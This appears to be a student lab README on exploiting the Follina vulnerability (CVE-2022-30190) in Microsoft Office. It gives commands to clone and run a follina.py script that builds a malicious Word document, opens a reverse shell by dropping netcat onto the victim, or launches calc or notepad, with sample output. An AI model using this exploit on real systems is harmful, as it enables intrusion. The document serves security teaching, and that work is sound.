# CVE 30190

> Amine TITROFINE | December 17, 2022

--------------

Follina (CVE-2022-30190) is a Microsoft Office zero-day vulnerability that has recently been discovered. It’s a high-severity vulnerability that hackers can leverage for remote code execution (RCE) attacks. It exists when MSDT is called using the URL protocol from a calling application such as Word. An attacker who successfully exploits this vulnerability can run arbitrary code with the privileges of the calling application. The attacker can then install programs, view, change, or delete data, or create new accounts in the context allowed by the user’s rights.


# Environnement 
2 VMs :
- **Attacker Machine**
    - kali-linux-2022.3-virtualbox-amd64 ( [Link To Downlaod](https://www.kali.org/get-kali/#kali-virtual-machines) )
- **Victim Machine**
    - Windows 10 (64 bits) ( [Link To Downlaod](https://drive.google.com/file/d/1YidMOwpc2h_wePDiKWeJ40V6oJz2Lhmo/view) )
    - Microsoft Office 2016 Pro ( [Link To Downlaod](https://drive.google.com/drive/folders/1CbTyNSBva6jAKKMPrp7PZlGfCJsYZmEc) )


# Exploit

```
$ git clone https://gitlab.com/grenoble-inp-ensimag/Secu3A/Devoir1/CVE_2022_30190_amine_titrofine_farah_ben_youssef_walid_lanjri.git

$ cd CVE_2022_30190_amine_titrofine_farah_ben_youssef_walid_lanjri

$ python3 follina.py –r 9999
```

After running the follina.py program a ( **follina.doc** )  will appear, this contain a malicious script .

In order to make easy sharing files with the two Vms, we ll use Python http Server
```
$ python3 –m http.server 8080
```
# Examples

Get a reverse shell on port 9999. **Note, this downloads a netcat binary _onto the victim_ and places it in `C:\Windows\Tasks`. It does not clean up the binary. This will trigger antivirus detections unless Antivirus is disabled.**
```
$ python3 follina.py -r 9999
```
Pop `calc.exe`:

```
$ python3 follina.py -c "calc"
[+] copied staging doc /tmp/9mcvbrwo
[+] created maldoc ./follina.doc
[+] serving html payload on :8000
```

Pop `notepad.exe`:

```
$ python3 follina.py -c "notepad"
```


